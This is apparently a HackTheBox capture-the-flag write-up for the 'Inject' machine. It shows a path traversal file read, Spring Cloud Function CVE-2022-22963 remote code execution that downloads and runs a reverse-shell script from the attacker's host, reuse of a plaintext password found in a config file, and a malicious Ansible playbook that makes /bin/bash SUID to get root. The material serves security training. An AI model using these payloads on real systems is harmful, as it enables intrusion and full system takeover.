

## About Inject HTB:


This is an easy-level machine in which we exploit a file upload vulnerability to make the page show us how we can access them. The page utilizes a parameter in the GET method to access system files, allowing us to exploit an LFI (Local File Inclusion) using the Directory Path Traversal technique.

#### Shell as Frank

After performing a brief enumeration in the directory where the web service is hosted, we detected the presence of the Spring Boot framework. We leveraged a vulnerability in this framework that allows us to achieve remote code execution. This way, we gained access to the system as the user "frank".

#### Shell as Phil

Subsequently, we proceeded to enumerate the personal directory of the user "phil" and successfully accessed a file that contained stored credentials. We utilized these credentials to log in as "phil".

#### Shell as Root

To escalate our privileges to "root", we exploited a cron job by abusing YML extension files and utilized the "ansible-parallel" tool, which is executed at regular intervals.



```
Machine: Inject
Difficult: Easy
Platform: HackTheBox
Release: Released on 3/11/2023
```



#### Recon: 


Port Scanning:

```
elswix@parrot > nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.35.222 -oG tcpPorts


PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63


```


We conducted a scanning process to identify the technologies and services running on the reported ports. In this case, there are only two open ports, but if there were more open ports, we stored the scan results in a grepable format, enabling us to use regular expressions to filter all the ports and format them appropriately for conducting the scan with nmap.

```
elswix@parrot > cat tcpPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS="/" | xargs | tr ' ' ',' | tr -d '\n'

22,8080
```


Comprehensive scanning of technologies and services running on ports 22 and 8080:


```
elswix@parrot > nmap -sCV -p22,8080 10.129.35.222 -oN fullScan

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



Currently, since we don't have any credentials, we should avoid excessive use of the SSH service on port 22. Instead, we should focus on enumerating and investigating port 8080, which seems to correspond to a web service. This will allow us to gather information and conduct further analysis on the web application running on that port.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/1.png?raw=true)


  
After reviewing the technologies used by the web service using the [Wappalyzer](https://www.wappalyzer.com/) extension in our browser, we did not come across any relevant or interesting information.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/2.png?raw=true)

We can observe that the page contains a YouTube video player displaying the following video:

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/3.png?raw=true)

However, this is not particularly relevant, so to speak.

Upon further examination of the page, we noticed a section in the upper-right corner of the website indicating "Upload."


![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/0.png?raw=true)


We navigated to that section and noticed that it prompts for file upload.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/4.png?raw=true)


I will proceed to create a text file (.txt) with some sample content to verify if it can be uploaded. I will save it in the "Downloads" directory for easy location and quick access.

```
elswix@parrot > echo "This is an example" > /home/elswix/Downloads/test.txt
```


We attempted to upload it:

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/5.png?raw=true)]]

  
We can see that you are requesting to upload image files. I will try uploading any random image from Google with the .jpg extension.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/6.png?raw=true)


Excellent, the file has been successfully uploaded. You can see that it prompts you to view your image, indicating that it has indeed been saved somewhere.


![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/7.png?raw=true)


It has worked successfully; the image has been uploaded and we can view it.


At this point, it is crucial to maintain active vigilance, especially from a hacker's perspective, as the image is not displayed through direct browsing of a specific directory, such as `/uploads/cat.jpg`. Instead, a section is employed that expects to receive the "img" parameter via the GET method, allowing the parameter to directly point to the uploaded file in the system. This scenario poses a potential risk, as we could attempt to exploit it for local file inclusion (LFI) in order to gain access to system-level files.

For example: 

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/8.png?raw=true)

We have observed that it did not work as expected. This could be due to the fact that it is searching for the "/etc" directory within the current directory, which may not exist.

In light of this, we will proceed to test a basic injection technique known as "Directory Path Traversal," which would allow us to navigate back several directories to reach the system root and then append "/etc/passwd". It is worth mentioning that the "/etc/passwd" file should exist if the Directory Path Traversal is successfully performed.


![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/9.png?raw=true)

We have successfully performed a Directory Path Traversal, and it appears that the file exists. However, due to the limitations of displaying only images, we are unable to view the content of the file in question.

Nevertheless, all hope is not lost. We can attempt the same request using the `curl` tool through the console:

```
elswix@parrot > curl -s 'http://10.129.35.222:8080/show_image?img=../../../../../../../../../../etc/passwd'

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false

```

That worked. We have successfully triggered an LFI. Now, we can view files that we should not have access to through the victim machine's website, leveraging this vulnerability.


### Shell as Frank

After enumerating the system further, we discovered that it utilizes the Spring Framework.

```
elswix@parrot > curl -s 'http://10.129.35.222:8080/show_image?img=../../../pom.xml'

<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>
```



By conducting some research on the internet, we have discovered a vulnerability associated with Spring Cloud. We can proceed to perform certain exploitation tests to see if we can successfully exploit it.


![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/10.png?raw=true)


While searching for the CVE on GitHub, we found the following repository:

[CVE-2022-22963](https://github.com/me2nuk/CVE-2022-22963)

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/11.png?raw=true)

In this repository, we have found a section that contains a command allowing us to remotely execute commands by making an HTTP request using the POST method, leveraging a Spring Cloud function.

```
elswix@parrot > curl -X POST  http://10.129.35.222:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.42/probando")' --data-raw 'data' -v
```


We are attempting to have the machine make a request to our web server using the "curl" command.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/12.png?raw=true)


We observe that the victim machine is making a GET request to our Python-based HTTP server. This indicates that we have successfully achieved remote command execution. Now, the next step is to send a reverse shell. We will proceed to create a file that contains the one-liner bash command to initiate the reverse shell.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/13.png?raw=true)
 
Now we will instruct the server to copy our `pwned.sh` file and save it in the `/tmp` directory. Subsequently, we will execute it to receive the shell.

```
elswix@parrot > curl -X POST  http://10.129.35.222:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.42/pwned.sh -o /tmp/pwned.sh")' --data-raw 'data' -v
```



![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/14.png?raw=true)


Now, finally, we will proceed to execute the file that we have stored at the path `/tmp/pwned.sh`.

```
elswix@parrot > curl -X POST  http://10.129.35.222:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/pwned.sh")' --data-raw 'data' -v
```

Before executing the file, we need to make sure we are listening on port 443 using the netcat tool.

```
elswix@parrot > nc -nlvp 443
```


![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/15.png?raw=true)


### Shell as Phil

Upon inspecting the personal directory of the user "Frank," we did not find the user flag. However, we did notice a directory named ".m2." Upon entering this directory, we discovered the "settings.xml" file, which contains credentials.

```
frank@inject > cat /home/frank/.m2/settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

  
We attempted to use these credentials to perform a migration to the user "Phil" and verified that they are correct.

```
frank@inject > su phil
Password: DocPhillovestoInject123
phil@inject > 
```


### Shell as Root

To escalate our privileges, the first step is to check if we have sudoers privileges. However, we did not find any relevant configurations in that regard. Nonetheless, we noticed that as the user "Phil," we belong to the "staff" group and have the ability to modify the contents of the "/opt/automation/tasks" directory.

```
phil@inject > id 
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)

```

```
phil@inject > find / -group staff 2>/dev/null
/opt/automation/tasks
/root
/var/local
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/local/lib/python3.8/dist-packages/ansible_parallel.py
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/LICENSE
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/RECORD
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/entry_points.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/WHEEL
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/METADATA
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/top_level.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/INSTALLER
/usr/local/lib/python3.8/dist-packages/__pycache__
/usr/local/lib/python3.8/dist-packages/__pycache__/ansible_parallel.cpython-38.pyc
/usr/local/share/fonts
/usr/local/share/fonts/.uuid

```



Considering that the directory is named "automation" and it contains a task within its "tasks" subdirectory, we can attempt to verify if our assumption is correct and if there is a task that runs at regular intervals. To achieve this, we can use the tool called [pspy](https://github.com/DominicBreuker/pspy).

After running it for a while, we observed that the root user executes the following:

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Easy/Inject/img/16.png?raw=true)


Upon reviewing the `/opt/automation/tasks/` directory, we found a file named `playbook_1.yml`. However, this file is owned by the root user, and we do not have write permissions on it. However, we noticed that the periodically executed task runs all files in that directory with the .yml extension. Therefore, we can attempt to exploit this circumstance to perform unauthorized actions.

After conducting an internet search, we found a page that demonstrates how to execute commands using these types of files. You can refer to the following link for more information: [Link to the page](https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_strategies.html)
  
Basically, we must create a .yml file with the following content:

```

---
- name: test play
  hosts: webservers
  serial: 3
  gather_facts: False

  tasks:
    - name: first task
      command: hostname
    - name: second task
      command: hostname
      
```


With this, we can leverage the fact that root executes the tasks to run privileged commands. In this case, we will execute the command `chmod u+s /bin/bash` to assign the SUID privilege to `/bin/bash`.

```
---
- name: test play
  hosts: localhost
  serial: 3
  gather_facts: False

  tasks:
    - name: first task
      command: chmod u+s /bin/bash
```

Next, we will save this content in a file named `pwned.yml` in the `/opt/automation/tasks/` directory. After a few minutes, the `/bin/bash` file will acquire the SUID attribute.

```
phil@inject > ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Now, all that's left is to execute the command `bash -p` to obtain a root shell.

```
phil@inject > bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
b1e**************************205
bash-5.0# 
```



### Thank you for reading:

+  [Instagram](https://www.instagram.com/elswix_/)
+  [YouTube](https://www.youtube.com/@ElSwix)
+  [Twitter](https://twitter.com/elswix_)
+  [HackTheBox](https://app.hackthebox.com/profile/935172)


#### My Blog: 

+ [WebHackology - Pentesting & Web Development](https://webhackology.vercel.app/)


